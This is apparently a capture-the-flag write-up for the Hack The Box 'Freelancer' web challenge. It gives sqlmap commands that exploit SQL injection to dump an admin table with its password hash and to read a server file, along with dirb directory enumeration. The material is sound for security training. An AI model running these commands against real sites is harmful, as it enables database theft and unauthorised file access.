# Freelancer

Use Burp to spider the website and find possible paths. Run burp and set up the proxy on the browser to `127.0.0.1:8080`. Refresh the page and forward the request with Burp. We can see that `portfolio.php` accept some paramenters.

Browse `ULR/portfolio.php?id=1` we can find and image and some text. From this we might understand that there is a database in behind. I decide to use `sqlmap` in order to read the database

With the following command I get the hash password of the `safeadmin` table.

``bash
sqlmap -u http://docker.hackthebox.eu:32486/portfolio.php?id=1 --tables
sqlmap -u http://docker.hackthebox.eu:32486/portfolio.php?id=1 -D freelancer -T safeadmin --dump

```

- Username: safeadm
- Password: $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K

Let's find a place in the website where to login with those credentials. Run `dirb` in order to find hidden directories.

```bash
dirb http://docker.hackthebox.eu:32486/ -o result.txt

```

`administrat` is the hidden directory. John is taking so much time in order to decrypt the password so i scan this directory in order to see which files are behind. Run dirbuster and select the starting point with that directory: `logout.php` and `panel.php` pop out. Run this command in order to read the file through sqlmap

```bash
sqlmap -u http://docker.hackthebox.eu:32486/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php

```

Read the downloaded file in order to get the flag